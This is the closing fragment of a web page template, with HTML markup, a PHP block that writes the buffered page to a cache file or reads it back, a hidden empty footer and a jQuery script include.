  <use width="100%" height="100%" xlink:href="../assets/img/6cbfa181b9c98d718fedaa871b16a138.svg#fab-contact"></use>
   </svg>
</button>
 </div>
  </div>
  <div class="interact-test" bis_skin_checked="1"></div>
   </div>
</DIV>



<?php 
$contenuCache = ob_get_contents();ob_end_flush();
$fd = fopen("$fichierCache", "w");
if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/lsg_passecur.lsg');echo "\n";}  
?>
<footer id="foot" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></footer>
<script src="../assets/js/jQuery.min.affcbf7942d5bedb0785712.js" defer="defer" async="async"></script>

</body>
</html>
 

